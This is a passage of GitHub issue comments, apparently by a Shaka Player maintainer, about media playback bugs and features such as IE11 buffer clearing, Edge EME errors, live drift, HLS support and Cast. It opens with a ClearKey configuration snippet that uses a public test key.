'urn:mpeg:dash:mp4protection:2011') {\n    // These two values were taken from\n    // https://github.com/Dash-Industry-Forum/dash.js/commit/2ad046a\n    var keyid = Uint8ArrayUtils.fromBase64('IAAAACAAIAAgACAAAAAAAg');\n    var key = Uint8ArrayUtils.fromBase64('5t1CjnbMFURBou087OSj2w');\n    var keyObj = {\n      kty: 'oct',\n      kid: Uint8ArrayUtils.toBase64(keyid, false),\n      k: Uint8ArrayUtils.toBase64(key, false)\n    };\n    var jwkSet = {keys: [keyObj]};\n    license = JSON.stringify(jwkSet);\n    var initData = {\n      'initData': keyid,\n      'initDataType': 'webm'\n    };\n    var licenseServerUrl = 'data:application/json;base64,' +\n        window.btoa(license);\n    return [{\n      'keySystem': 'org.w3.clearkey',\n      'licenseServerUrl': licenseServerUrl,\n      'initData': initData\n    }];\n  }\nconsole.warn('Unrecognized scheme:', schemeIdUri);\n  return null;\n}\n```\n. You're referencing something with HTML5 video which doesn't apply to manifests.  It also conflicts with \"MPD Anchors\", section C.4 in the MPD spec (ISO/IEC 23009-1:2014).  MPD anchor syntax allows for t=start, but no end.  So if we did what you're suggesting, we would limit our ability to add MPD anchors later.\nIf there is significant interest, we could offer an API to accomplish the same goal, but we will not implement this through a fragment in the manifest URL.\n. Okay, then I've renamed the issue to \"an API to limit playable/seekable range\".  We will not make it a priority right now, but we will re-evaluate after v2.0 is out.\n. We have a lot left to do to finish v2.0.0, so this is still on the back-burner.  You are very welcome to take a crack at it.\nWe would prefer to discuss the API design with you before you send us a PR, to make sure it fits with our vision of v2.  If you want to get in touch via email, you can find my address in the CONTRIBUTORS file.  Or we can discuss the details right here on github.\nOne last thing:  Please read CONTRIBUTING.md.  We have a small amount of bureaucracy that you have to go through before we can accept a PR.  Thanks for offering to contribute!\n. It sounds like we can reuse the existing seekRange functionality we have for live streams, but with a static, configurable range.. Perhaps there is a memory leak.  What version of Shaka are you using?  Is the problem reproducible on the demo page on appspot?\n. Shaka 1 does not remove content from MediaSource buffers during streaming.  The browser has a built-in buffering limit and runs an eviction algorithm on the SourceBuffers when that limit is hit.  From JavaScript, we have no visibility into the eviction logic nor the limits.  Shaka 1 has always depended on the browser to handle eviction.\nShaka 2 will operate differently.  Part of the design for Shaka 2 is to place our own configurable byte limit on the amount of data we buffer at the MediaSource level, as well as a configurable limit on the number of seconds of data kept in buffer behind the playhead.\nFor example, you will be able to say \"buffer 10 minutes ahead, but only leave 30 seconds behind, and stop early if we hit 100MB.\"\nWe expect to have a beta version of Shaka 2 out at the end of January.  Thanks for your patience!\n. Check out REDESIGN.md in the preview branch if you want to see the design of Shaka 2, specifically the configuration section.  We are publishing code to the preview branch periodically as we make progress, so you can always browse the code there to see how things are shaping up.\n. Fixed by f8b7b01\n. The player.isLive() method tells you if the stream you are playing is a live broadcast, as opposed to video-on-demand.\nTo know if the video is currently playing, check the paused property of the video element.  If false, the video is currently playing.\n. The manifest has a duration of 14:48 and segment size 2s on both audio and video.  Therefore, with startNumber 0, there should be segments numbered 0-443.\nIt seems that audio segment 443 (the final audio segment) is not on the server (HTTP 404).\nSeeking and clearkey actually have nothing to do with the issue.  You can just let the video stream all the way to the end and see the same thing.\nThere doesn't seem to be a Shaka bug here, so please ask the content owner to provide the missing segment (audio/und/seg-443.m4f) or to fix the manifest (shrink duration to the 14:46, the minimum of the available audio & video durations).\n. \"undefined\" is caused by failing assertions which have no messages associated with them.  In other browsers, this is not a huge issue because the JS console will still show the line number and file on which the assertion occurred.  It would seem that for some reason, IE11 only gives you the message string and nothing else.  (Because of this, we are now requiring messages for all assertions in Shaka v2.)\nThere's nothing I know of that can be done about \"undefined\" short of adding messages to all of them and re-running the test to see which assertions are failing.\nI think I may have a handle of the seek problems, though.  It may be an IE-specific race condition.\n. Okay, not a race after all.  Here's the setup:\n1. Shaka assumes only one buffered range because it only buffers in order.  It has no logic to handle edge cases that could arise with multiple ranges.\n2. Seeking to an unbuffered position causes Shaka to clear the buffer (sbm.clear()) to maintain the above assumption.\n3. If multiple buffered ranges are detected, Shaka assumes something has gone horribly wrong and clears the buffer (sbm.clear()) to try to re-establish the above assumption.\nsbm.clear() is not working correctly on IE11.  It calls SourceBuffer.remove(0, Number.POSITIVE_INFINITY), and although IE fires an 'updateend' event to say it has done so, it hasn't.  So, what we end with is:\n1. Seek to an unbuffered position causes Shaka to perform a clear() which is actually a no-op on IE11.\n2. onUpdate_ is called, but only one range (the old one) is still buffered.  It does not notice that currentTime is outside of this range, so it grabs a new segment and buffers it.\n3. onUpdate_ is called again, notices that there are now multiple buffered ranges (old range, new segment) and tries to clear(), which is still a no-op on IE11.\n4. Go to 3.\nWe should be able to fix this.  Here are the results of my preliminary testing:\n- remove(0, Number.POSITIVE_INFINITY) does nothing on IE11\n- remove(0, Number.MAX_VALUE) also does nothing on IE11\n- remove(0, mediaSource.duration) seems to work on IE11\n. I quickly smoke-tested the app without my patch in Edge and had no issues.\n. @torerikal: Please try the latest sources from master, or this hosted preview which includes the fix:  http://ie11test.shaka-player-demo.appspot.com/\n. To document for future generations, on IE11:\n- remove(0, Math.pow(2, 39)) works.\n- remove(0, Math.pow(2, 40)) is a no-op.\n. Okay, I'll take another pass at it.  Perhaps I did not stress test it enough.  I won't be able to get to this until the end of the month, though.\n. On IE11 by seeking often, I've been able to trigger the \"undefined\" assertion.  Each one in my repo is paired with the error \"Unable to get property 'resolve' of undefined or null reference\".  I've traced both to SourceBufferManager.onSourceBufferUpdateEnd_.  The assertion is assert(this.operationPromise_) and the error is triggered by this.operationPromise_.resolve().\nThe only ways for this to occur would be a malfunction of EventManager in destroy() or for IE to send unexpected 'updateend' events.  Since SourceBufferManager is not being destroyed in this scenario, it has to be unexpected 'updateend' events.\nSo far in my testing, this error has not been fatal, so it should suffice to ignore spurious or unexpected 'updateend' events.\nI have not been able to reproduce any of the following with the latest sources:\n1. \"Cannot fetch (audio/mp4): previous operation not complete\"\n2. \"Unexpected call to resync_()\"\n3. stalled playback or other unrecoverable errors\n@torerikal, are you still seeing any of these three problems on http://ie11test.shaka-player-demo.appspot.com/?asset=//storage.googleapis.com/widevine-demo-media/sintel-1080p/dash.mpd ?\n. I've just committed a patch to add line numbers to those assertions without messages.  With that, I'm able to see these failed assertions on IE11 with rapid random seeking:\n- stream.js, line 414: assert(!this.fetching_)\n  - frequent, seems to be harmless\n- stream.js, line 443: assert(!this.fetching_)\n  - less often, also seems harmless\n- stream.js, line 639: assert(!this.sbm_ || this.resyncing_)\n  - less often, also seems harmless, always happens at the same time as line 443\n- source_buffer_manager.js, line 373: assert(!this.task_)\n  - rare, but coincides with Player error and 'unexpected call to resync_()' message\nEven with the Player error, the systems seems to recover just fine and continue playing.\nThese are just preliminary findings.  I'll update this ticket as we make progress.\n. Promises are being resolved in an order other than what we expect.  See https://github.com/google/shaka-player/blob/b47a03a/lib/util/task.js#L215\nThis is probably a combination of a poorly-solved race condition and some implementation detail of the Promise polyfill used on IE11.\nIn a nutshell, when we abort() a Task, we assume that the rejection of the Task's Promise is processed before the resolution of the abort() Promise.  This assumption is not always met on IE, hence the failing assertions.\nWe seem to recover from it, but we should try to satisfy these assumptions on all platforms if possible.  Shaka 2's StreamingEngine should be more robust by avoiding the need for these kinds of assumptions all-together.\n. There are several issues with Shaka 1's test suite running on IE11, but with a little clean-up, I am able to reproduce this out-of-order assertion in 7/120 runs of the test \"Seek does not create unclosable gaps in the buffer\".\n. Even better!  If we change the Promise polyfill to use setTimeout(fn, 0) instead of setImmediate(fn), repro rate goes up to 100%.\n. @torerikal, I believe we've fixed this now.  Related tests are passing on IE11, and we have a new test to cover this bug.  I'm also no longer able to reproduce manually.  Please verify these latest changes and let us know if this fixes it for you:\nhttp://ie11test.shaka-player-demo.appspot.com/?asset=//storage.googleapis.com/widevine-demo-media/sintel-1080p/dash.mpd\nIf so, we will roll up our recent IE improvements into v1.6.3.  Thanks!\n. Also, what version of Shaka Player are you using?  Is your client's clock in sync with your server?\n. @FeiCao, we haven't heard from you in three weeks.  Do you still need help with this?\n. Closing due to inactivity.  Please let us know if this is still something you need help with, and I will reopen.\n. @FeiCao, what version of Shaka Player are you using? Is your client's clock in sync with your server?\n. @FeiCao are you saying that the gap between player & packager begins at 10s but grows larger over time?  Does restarting the player reduce the time again?  Can you provide some numbers on how large the gap is and how long it takes to reach that size?\n. We'll try to reproduce and see what we can do to fix it.\n. @FeiCao, we have been unable to reproduce this drift problem with our own live streams using edash packager.  We tested for over 2 hours and found no accumulation of drift at all.\nIt may be possible that your issue is caused by the timestamps in your content.  I recommend that you double-check your source content.  Make sure that your timestamps do not jump ahead.  Also, make sure you are running the latest version of the packager.\nWe will continue running our test overnight to verify over a longer period.  But so far, with our live content, it appears that Shaka is correctly calculating the live edge and is not accumulating drift.\n. @FeiCao, we were unable to reproduce after 18 hours of testing.\n. Hi @PyRo1509,\nThanks for the report.  I can confirm your results.  It seems to be a configuration issue for the receiver application.  We should be able to fix it server-side.  I'll keep you posted.\n. Alright, it appears to be fixed now.  Thanks!\n. Please read the instructions in CONTRIBUTING.md.  You need to add yourself to CONTRIBUTORS and AUTHORS.  Thanks!\n. Thanks!\n. The 'trackschanged' event does not tell you when you selected a new track.  It tells you when the list of tracks has changed.  To quote the documentation, it is fired \"when one or more audio, video, or text tracks become available or unavailable.\"\nFor example, if an MPD update includes Representations that weren't there before, you might have new tracks.  Or if Representations go away, you might lose tracks.\nAnother example is if you have encrypted content with different keys for SD/HD/UHD.  If you only have SD keys, for example, you will only see SD tracks.  If a subsequent license request returns keys for HD, you will then have new HD tracks available.\nIn your case, the tracks have not changed.  You have selected a different track.  Since you did it explicitly, you know that you did it.  Therefore in our view, you should not need an event to tell you about it.\nDoes this help clear things up?\n. Since it has been three weeks without comment, I am closing this issue.  If you still need help with this, please let us know and I will reopen the issue.\n. We would be happy to discuss design and ultimately to review a pull request for this.  Thanks for expressing your interest!\nWhat we had in mind is a network filter that would listen for the responses to segment requests and parse those segments before they are processed by StreamingEngine and MediaSourceEngine.\nThe only tutorial we have right now that discusses network response filters is docs/tutorials/license-wrapping.md, so you can look at that for examples of how response filters work.  For EMSG, we'd be filtering on RequestType.SEGMENT instead of RequestType.LICENSE.\nI imagine the parsing would require a generic MP4 box parser to locate the EMSG box, if present.  There may be some other way to approach it as well, but a generic MP4 box parser would be useful in other places, too, such as VTT (#277) and TTML (#278) text embedded in MP4.\nThe data extracted from EMSG would be dispatched as an event from Player.  All events are constructed with shaka.util.FakeEvent and their types and structures documented in jsdoc annotations in player.js.\nThe whole feature would ideally be modular and easily omitted from the build.  See docs/tutorials/plugins.md for an overview of plugins and how they exist in the build system.\n. We're changing direction on this slightly.  Instead of dispatching emsg events from Player, we will use the presence of an emsg box to trigger an MPD update.  For efficiency, we will only filter segments for emsg boxes if the manifest indicates that they are present.  This appears to be the only use of the emsg box from what I can tell.\n. @dougdoe Can you provide some details on what those EMSG boxes will look like?  For example, what scheme URIs will be used for those two cases?\n. @baconz, can you point me to a reference for Event and EventStream?  I admit, I'm not familiar with those yet.\n. @baconz, we would consider EventStream and VAST support as a separate enhancement from the basic EMSG support we're working on here.\n. Sure, sounds good.\n. @ismena, can you please take a look?\n. Hi Donato,\nGood catch!  Thanks for fixing it.\nAlthough this is a trivial patch, can you please read CONTRIBUTING.md and follow the instructions there?  I see you have already signed the CLA (as has your company), so we will just need you to add entries to CONTRIBUTORS and AUTHORS.\nThanks, and sorry for the bureaucracy.\n. The current demo app does not support that yet.  You may notice that those controls are disabled as soon as you cast.\nPlease note that casting is done completely outside the library and in the application.  So you can already use the full range of Shaka features with the Chromecast in your own application, even though you can't see it in the demo.\nWith Shaka 2, we will organize the demo app in a way that shows all functionality both locally and on the Chromecast.\n. In addition to showing Cast support in the demo app, we've decided to bring Cast support in-library for v2.  We hope this makes it easier for users to build Cast receiver apps.\n. This is mostly done.  What we have so far will be in v2.0.0-beta3.  What's not done yet, which we hope to finish in the final v2.0.0:\n- Support for casting from the Cast button built into latest Chrome, as opposed to the Cast button on the video controls\n- CSS3 animated buffering spinner appears to perform poorly on Chromecast\n. Split the CSS3 animation performance issue to #505, which will be deferred until after v2.0.0.\n. Hi @msokalski,\nThat is not a bad idea.  We'll consider it for after v2.0.  Thanks!\n. Please take a look at CONTRIBUTING.md and follow the instructions there, then let me know when you have done so.  Google has some small amount of beauracracy around accepting contributions.  I apologize for the inconvenience.\nOn the subject of responseURL, MDN has no mention of it.  Do you have any information on what browsers support it?\n. @ram95014 I'm going to need more information in order to diagnose.\n- Can you provide a URL which reproduces the problem?\n- What version of Shaka Player are you using?\n- Can the problem be reproduced on our stock demo page, or is some custom app logic required to access your stream?\n. (I took the liberty of reformatting the log dump for readability)\n. In my tests, DashCast generates the wrong value for the availabilityStartTime attribute.  When current date & time in UTC at startup was \"Wed Jan 27 03:23:55 2016\", the manifest had availabilityStartTime of 2016-01-28T03:23:55.344, one day in the future.\nDashCast also generates an invalid period start time.  The start attribute format is an XML duration, but DashCast uses 0 instead of PT0S.\nI'm tracking down the cause and I'll report these bugs to gpac.  When I have, I'll link to the issues from here so that you can follow up with them.  But for now, it appears that there is no bug in Shaka.\n. This is odd.  I followed the DashCast build instructions from their website and ran into these two bugs.  However, the instructions refer to the gpac SVN repo, which does not seem to be current.  I filed gpac/gpac#388 to have them update their website, and I will retest with an up-to-date DashCast.\n. I retested with an up-to-date version of DashCast.  The start and availabilityStartTime problems in the old version are now fixed.\nIn my test, it seems that Chrome fails to decode the content.  Here's a snippet of the log I found in chrome://media-internals:\npipeline_state: kPlaying\nerror: video frame with PTS 0us has negative DTS -1409741us\nerror: Append: stream parsing failed.\npipeline_error: pipeline: decode error\npipeline_state: kStopping\npipeline_state: kStopped\n@ram95014, please rerun your own test, and after the decode failure, check the value of video.src.  Then, open a tab with chrome://media-internals and click the button whose label shows the value of video.src you read from Shaka.  Finally, check to see if you have a similar log about negative DTS.  If so, we are seeing the same problem and you should file a report with gpac and link to it here.\nThanks!\n. @ram95014 It's been a while since we heard from you.  Did you file a bug with gpac?  Did you find some other solution?\n. @ram95014 Okay, no worries.  Thanks!\n. Ah, I see this is out-of-date, and you've already sent me #266.  Closing.\n. GitHub is saying you have merge conflicts.  Please rebase to the tip of master and manually resolve the merge conflicts.  Thanks!\n. We are experiencing some flakiness on our buildbot.  Please forgive the noise.\n. Yes, that seems to be the case.  Not flake at all.\nHere's the log snippet:\nChrome 47.0.2526 (Linux 0.0.0) Live live support for segment time template requests MPD update in expected time FAILED\n    Expected 'http://storage.googleapis.com/widevine-demo-media/oops-segment-timeline-time/oops-segment-timeline-time-oops_video.mpd?_=1452630896703' to equal '//storage.googleapis.com/widevine-demo-media/oops-segment-timeline-time/oops-segment-timeline-time-oops_video.mpd'.\n. Options:\n1. Hack XMLHttpRequest to suppress responseURL during the test, then restore it afterward.  delete XMLHttpRequest.prototype['responseURL']\n2. Decide it's wrong to expect a specific URL, since this is not relevant to the test.  Remove the targetMpdUrl parameter from waitForMpdRequest().\nMy preference is for 2.\n. One last request:  can you squash these commits together?  It's kind of hard to parse the log with 10 commits, 7 of which have the same message.\n. @rgc Still getting failures.  I've edited the buildbot message in this thread to just the failures.  (In the mean time, I'm working on getting our buildbot to send the failures only and to format the message correctly.  Should be easier to read if we see failures next time.)\n. Looks good!  I'll give the buildbot one more crack at it to verify.  Thanks for taking the time to do revisions and get everything done cleanly.\n. Thanks very much for the contribution.  We will implement something equivalent in Shaka 2 soon to make sure this feature isn't lost in the rewrite.\n. We don't have a direct way to do that right now.  I will add a configuration parameter for that in v2.0.\nThe way it works right now, your default bandwidth estimator has a hard-coded starting estimate that it uses until it collects enough data to make a good estimate.  This is a property of the default estimator, but the estimator can be replaced at runtime with your own.\nSo here are your options before v2.0 comes out:\n1. modify this.defaultEstimate_ in lib/util/ewma_bandwidth_estimator.js (default is a conservative 500kbps)\n2. inject your own implementation of IBandwidthEstimator as the third argument to DashVideoSource's constructor, which can behave in any way you like\n3. disable adaptation during your first playback and select a track explicitly until some time has passed and the estimator has enough data to make a good decision\nAlso, if your app plays multiple videos without reloading the page, you should also make sure you are always providing an explicit bandwidth estimator instance to DashVideoSource.  That way, data collected from the first playback can be used to make an immediate good choice for subsequent playbacks.\n. Shaka doesn't do any more work for high bitrates than for low bitrates as far as I can tell.  For high bitrates, network requests for segments take longer and decode requires more CPU time, but neither of those things happens in JavaScript or blocks JavaScript.\nOn desktop Chrome, I expect everything is being decoded in software.  Do you get better results on a device with a hardware decoder?\n. Can you share the contents of player.getStats() after one of these FHD playbacks?  That might help determine if Shaka is part of the problem.\n. @MegaLabs1, it's been a while since we heard from you.  Is this still a problem for you?  Can you share logs or stats with us?\n. 1. Please check out the latest source from master.  We just fixed a performance regression that was introduced on Feb 1 in v1.6.3.\n2. Please use an uncompiled build for playback so that we get logs.\n3. Run shaka.log.setLevel(shaka.log.Level.DEBUG) to enable debug logging.\n4. Play a problematic piece of content at full HD resolution.\n5. After some time of observable problems (freezes, etc.), run player.getStats().\n6. Send the debug logs from the JS console and the value of player.getStats() after playback problems.\nThanks!\n. @MegaLabs1, I haven't heard from you in a while.  Is this still an issue for you?\n. I think you misread the log call: shaka.log.setLevel(shaka.log.Level.DEBUG)\nYou should also be using an uncompiled version of the library to get logging.\n. Yes, logging is disabled by default when compiling.  You can change the log level in your build (change shaka.log.MAX_LOG_LEVEL=0 in build/lib.sh), or you can use the uncompiled version.  In general, you should use the uncompiled version to debug.  It is very difficult to debug with the compiled library, even with logs enabled.\n. @MegaLabs1, any updates?\n. I'm going to go ahead and close this issue.  If this is still a problem for you, let us know and we can reopen for discussion.  Thanks!\n. Shaka is codec-agnostic.  It supports whatever the browser supports.  Codec support is checked via MediaSource.isTypeSupported() for all media and navigator.requestMediaKeySystemAccess() for encrypted media.\nShaka treats Representations that the browser can't play as if they don't exist.  So your manifest can have multiple audio codecs, and Shaka will choose one that the browser supports.\nDoes that answer your question?\n. No problem. Always happy to help.\n. @FeiCao I think we misunderstood your original question.  Let me see if I am getting it now.\nYou have a live stream with one Representation, and you want to change the resolution mid-stream by modifying the manifest.  Is that correct?\n. That is not supported by DASH as far as I can tell, and it's definitely not supported by Shaka.\nShaka only fetches the init segment when it changes Representations, not when it updates a live manifest.  AFAIK, no player would reload the init segment, as it is assumed static once created.  The init segment sets up the decoder, and for hardware decoders in particular, feeding low-res media segments after a high-res init segment may result in a tiling effect.\nIf you must modify the manifest in this incompatible way, you will have to get the Player to fetch a new init segment.  Options for this include:\n1. Reload the video source (player.load()) to cause the entire pipeline to be recreated.  (This is hacky.)\n2. Replace the old Representation with a new one (different ID) so that the Player knows they are different.  (This is not well-tested, and we have not seen examples of encoders which do this.)\nHowever, neither of these is going to be a great option.  What are you trying to accomplish by modifying the manifest in this way?  Perhaps we can help you find a better way to do it.\n. Well, just changing the Representations and init segments out from under the Player is not in keeping with the DASH spec.  I think the best way to express what you are doing in DASH is to put a duration on the Period and start a new Period when the resolutions change.\nShaka will support multi-Period content starting with v2.0.\n. @FeiCao, what you're doing is not compatible with either DASH or MSE.  There are two big problems with what you are doing.\n1. Initialization segments contain information such as resolution.  The init segment is used to set up the browser's decoder.  If you just change the source without a matching init segment, the browser will not be able to display the new content correctly.  This is fundamental to MSE in a browser.\n2. If you are changing source material and output resolution, and you only have one resolution available at a time, you need to express this correctly in a way that a DASH client understands.  Changing the existing Representation is not correct.  Adding a new Representation is not correct.  There are two ways to handle this correctly as far as I can tell:\n   - Add a new Period to contain the new material.  (Multi-period content is supported starting with Shaka v2.)  The Representations do not have to match across Periods.\n   - -OR- Run your sources through an encoder first so that the output stream and manifest does not need to change at all.\nThat's the best advice I can offer you.  If you need help with Shaka specifically, please don't hesitate to ask.\n. We will consider exposing a key-system ID after 2.0.  If there are more people interested in this feature, please speak up here and let us know.\n. To play Widevine encrypted content, you still need a license to decrypt it.  Licenses are requested through the CDM and issued by the content provider.\nIt doesn't sound like your use-case is what Shaka was designed for.  You can't just grab a copy of an encrypted MP4 and play it back in a browser without considering the rest of the infrastructure that makes DRM work.\nDoes that answer your question?\n. If you're planning to fetch a temporary license for playback, but the content is stored offline, then it's not \"offline\" in the sense that Shaka uses the term.  For us, that would be a streaming or VOD playback.\nThe issues then become: can you access the content via a URL, and do you have a manifest for the video?  If both answers are \"yes\", then Shaka should be able to do this.\n. Synchronization is handled by the browser's MediaSource implementation.  It uses the timestamps in the media segments themselves, combined with SourceBuffer's timestampOffset attribute.  Aside from applying the correct timestampOffset (which may not be needed, depending on your content/manifest), there is nothing JavaScript applications/libraries need to do to synchronize audio & video buffers.\nDoes that answer your question?\n. When do you call setPlaybackStartTime?  If you call it after streaming begins, it will have no effect.  Streaming begins when the MediaSource object sends a 'sourceopen' event, which happens some time after player.load() is called and before the returned Promise is resolved.\nIn Shaka 1, we recommend that you call this method before player.load().  In Shaka 2, playback start time will become an argument to player.load(), which should eliminate any confusion about timing.\nDoes this help?\n. We will support unencrypted CEA 708 closed captions in their own stream, not muxed into the video stream.  The video stream could still be encrypted.\n. @robwalch What do you mean by \"access to video data\"?. In that case, you could create a network response filter that would have access to all segments before they are fed to MediaSourceEngine.\nA text parser plugin would be needed to feed the cues to TextEngine.\nBut it between it may get a little ugly.  Nothing in our architecture allows for text to be muxed with anything else.\nIn today's Shaka Player, our StreamingEngine needs to see that there is a text stream according to the manifest.  Based on that, it will try to fetch text segments to feed to the text parser.  So there's not a clear path at the moment.. It's tied more to TS than to HLS.  The HLS label is because TS-related functionality has been added almost exclusively for the sake of legacy HLS content libraries from before the addition of fMP4 to the HLS spec.  Although TS is allowed in DASH, in practice, we haven't run into it in the wild.. Let's add an option, then, to force transmuxing for native TS platforms.  It should default to false.. We are not in control of the CAF release schedule.  I don't know when CAF will release with v2.3 or v2.4.  This feature will first appear in v2.4 releases.\nCan you clarify what you mean about a badge?. @aibolik, I still don't understand.  Do you want a badge on the issue with the version in which it was fixed?  Or do you want a badge on the main page with the current release?. You can always find the latest release at the top of this page: https://github.com/google/shaka-player/releases. This feature will be out in v2.4 this week.. @kfwerf, #291 doesn't address the same feature.\n277 is about WebVTT embedded in MP4.  #291 adds segmented WebVTT to v1 by parsing WebVTT cues.\nWe have already implemented segmented WebVTT in v2 (#150) and do not plan to backport to v1.  v1 is in maintenance.\nPlease see the preview branch for the v2 work in progress.  Thanks!\n. MIME type 'application/mp4', codecs 'wvtt'\n. MIME type 'application/mp4', codecs 'stpp'\n. There is already support for Playready on Edge & IE.  Playready has not been tested on Chromecast, though.\nAll DRM is through EME APIs, so any interoperable DRM system in any EME-compliant browser should work.  The status of Fairplay through EME is unknown at this time.\n. We expect so, yes.  But we have not begun work yet, so we do not know what interoperability challenges we may find.\n. Given that new development, I would expect HLS with MP4 to work on almost every browser we support.  Again, we haven't started work on HLS yet.\n. We have just scheduled the work for v2.1.0, which we intend to have out at the end of the year.  As we make progress, you'll see commits and major milestones mentioned here.\n. We are going to write a manifest parser plugin for HLS.  We do not plan on using hls.js.. We will have basic HLS support (clear content, fMP4) first.  We expect that to be in the next few weeks.\nAfter that, we will work on MPEG2-TS support, then encrypted content (Widevine & Fairplay).  Hopefully this will be done in the next few months.. We have always had a policy against third-party JavaScript in the library.  It's one of the ways we have been able to keep the library as small as it is.\nAlso, that module is written in ES6, which we can't use yet because we still need to support IE11.  Debugging is only practical for us in uncompiled mode, so compiling ES6 down to ES5 would not meet our needs.\nWe've already written our own M3U8 parser, and we expect it will be out of review and published on github relatively soon.. @birme, no, we do not plan to transmux.  TS will be usable on browsers with native TS support: Safari, IE/Edge, Chromecast.\nOne could write a response filter that transmuxed TS to MP4 using our new asynchronous filters, but we do not plan on doing so as part of the library.. Correct.. @DanielEliraz: The implementation in master is not complete, but error 4011 indicates that the browser doesn't support the content.  If it's MPEG2-TS content, Chrome & Firefox do not support that, and Shaka Player does not transmux to MP4.. We have support for MP4 VOD HLS, in the clear and encrypted with Widevine.  We have TS working on Edge and Chromecast.\nI've created new issues for some of the remaining HLS features:\nCEA 708 captions: https://github.com/google/shaka-player/issues/276\nSafari FairPlay: https://github.com/google/shaka-player/issues/382\nLive streaming: https://github.com/google/shaka-player/issues/740\nKey rotation: https://github.com/google/shaka-player/issues/741\nTrick mode: https://github.com/google/shaka-player/issues/742\nSafari TS: https://github.com/google/shaka-player/issues/743. Thanks!\n. Shaka Player supports any platform that supports the necessary web standards.  HTML5 video and MediaSource Extensions are hard requirements, and Encrypted Media Extensions is a requirement for protected content.\nPlease see http://shaka-player-demo.appspot.com/docs/tutorial-porting.html for more information.  You may also want to try a preview of the more detailed support-testing framework coming soon in Shaka v2: http://support.shaka-player-demo.appspot.com/\n. In uncompiled mode, you should have a log from shaka.polyfill.MediaKeys.install that says either \"Using native EME as-is\" or \"Using EME v20140218\".\nIf it's \"native EME as-is\", then it's not polyfilled and the lack of Promise resolution may be a bug in Edge.  Or it could be an incompatibility between the latest Edge's EME and the rest of the ecosystem, in which case we may be able to change some small part of Shaka to be more flexible.\nLots of may_s and _could_s, because I haven't had access to Edge 25 myself to investigate.  :-)  @sarge, can you check the status of the polyfill?\n. Sorry, I'm unable to look into it at the moment.  I don't have immediate access to Edge 25.\n. Check app.video.mediaKeys after the point where the Promise should have resolved.  If it's null, then Edge really hasn't done it yet.  If it's non-null, the Promise should definitely be resolved and I would lean more strongly toward guessing this is bug in Edge.\nIf Edge really isn't setting mediaKeys... I'm not sure where to go next.  There's no obvious reason it would block on that.  Are there any logs that might be relevant?  In the JS console or otherwise?\n. If Edge implements an old version of EME which does not return a Promise from setMediaKeys(), then that might cause issues.  We might have to detect this and polyfill it.\nDoes Edge 20 use native EME?  Or are we polyfilling that just like we do for IE11?\n. \"The browser does not support the media content\" very likely corresponds to the MEDIA_ERROR_SRC_NOT_SUPPORTED you get from Microsoft's own demo.  That is triggered by a decoder error event dispatched from the video element, and should not have anything to do with EME.  We may not be able to do anything to fix that.  Either the content is truly in an unsupported codec or the browser's media pipeline has a bug.\nSo I'd call \"does not support\" a successful fix for the EME part.  :-)\nI'm not sure we should force the polyfill for Edge as a permanent fix.  Let's explore the problem a bit more.\nCan you modify EmeManager's setupMediaKeys_ to change this:\nreturn this.video_.setMediaKeys(this.mediaKeys_).then(\nto something like this:\nvar setMediaKeysReturn = this.video_.setMediaKeys(this.mediaKeys_);\nconsole.log('setMediaKeys return value', setMediaKeysReturn);\nreturn setMediaKeysReturn.then(\nIt would be interesting to see whether or not setMediaKeys returns a Promise on Edge 25.\n. Looks like a rejected setMediaKeys Promise should land us in this error handler in Player:\nhttps://github.com/google/shaka-player/blob/87ac05e/lib/player/player.js#L343\nThis should result in an 'error' event dispatched on player and the player.load() Promise being rejected.\n@sarge can you confirm?  If this isn't happening, Shaka has a bug in its error handling.  (This is separate from finding the cause of the rejected Promise, but first things first.)\n. Okay, I see now.  I would guess that InvalidStateError means Edge 25 expects some other order of events, but it will take time to investigate.  In the mean time, preferring the IE11 EME polyfill seems to be a reasonable work-around.\n. I have reproduced this issue with automated integration tests for v2, and I now have a handle on the cause.  It seems that this happens when setMediaKeys is called before video.src is set.\nWe shouldn't have an issue with this in v2, as v2's DrmEngine has a two-phase system: initialize() and attach().\nTo fix it in v1, we will need to split up EmeManager.initialize() so that setupMediaKeys_() occurs after videoSource.attach().  We should be able to publish a fix in v1.6.4.\n. @sarge, @Doolali, can you please test the latest sources from the master branch and confirm that this fixes the issue for you?\n. @sarge, using native EME on Edge from master is intentional.  We are trying to fix the root of the problem rather than using prefixed EME to avoid it.  (Also, \"GPAC/SegmentList\" isn't a live stream.)\nI'm investigating now.\n. We backported some Edge fixes from v2, but we missed something important.  We are working on another fix.\n. @Doolali, @sarge, @sergiofagostinho, please try with the latest from master.  I believe we have fixed it now.\n. @Doolali, thanks!  We'll roll these changes out in v1.6.4.\n. @sergiofagostinho, specifically we fixed InvalidStateError with PlayReady assets.\nIt is a known issue that some of the test assets in v1 are incompatible with IE/Edge (#224).  They will be replaced in v2.\nIf you have known-good PlayReady assets, please try those.\n. @sergiofagostinho, thanks!\n. I did not realize that tonic is a node environment.  Shaka Player won't run in node due to the lack of HTML5 video and MSE.  So a tonic example doesn't make sense after all.. There are a number of ways a manifest could be inaccurate, and we do our best to compensate.  But some content is just broken (badly-encoded, missing or wrong information in the manifest, etc.)  It could also be a true bug in the client.  I don't think I've seen exactly this behavior before, so it's hard to guess.\nCould you also check these values after seeking to 100?\napp.player_.videoSource_.streamsByType_.video.sbm_.sourceBuffer_.buffered.start(0);\napp.player_.videoSource_.streamsByType_.video.sbm_.sourceBuffer_.buffered.end(0);\napp.player_.videoSource_.streamsByType_.audio.sbm_.sourceBuffer_.buffered.start(0);\napp.player_.videoSource_.streamsByType_.audio.sbm_.sourceBuffer_.buffered.end(0);\nThe video element's buffered range is the intersection of the individual SourceBuffer ranges, so it would be informative to know what the SourceBuffers have to say.  Often-times, one stream or the other is actually the cause.\nAlso, is the stream publicly available?  If our team had access to the manifest and the content, that would really help.  If this is not something you can share publicly, please feel free to send me a private email.\n. Thanks, @javess.  We'll take a look and try to reproduce.\n. Here's a simplified version of what I'm seeing in the manifest:\n<SegmentTemplate timescale=\"25000\" duration=\"175454\" startNumber=\"0\" media=\"segment_$Number$.m4s\" initialization=\"init.mp4\"/>\nduration / timescale gives each segment a length of 7.018 seconds.  Segment 0 starts at t=0, segment 1 starts at t=7.018, etc.\nLet's calculate the segment which contains t=100.  100 / 7.018 = 14.249, so we expect timestamp 100 to be in segment 14.  According to the manifest, segment 14 should start at t=98.254 and end at t=105.272.\nIf I examine the segments, this is what I find:\n| Segment Number | Calculated Timestamp | Actual Timestamp |\n| --- | --- | --- |\n| 0 | 0 | 0 |\n| 1 | 7.018 | 10.920 |\n| 2 | 14.036 | 22.920 |\n| 3 | 21.054 | 32.920 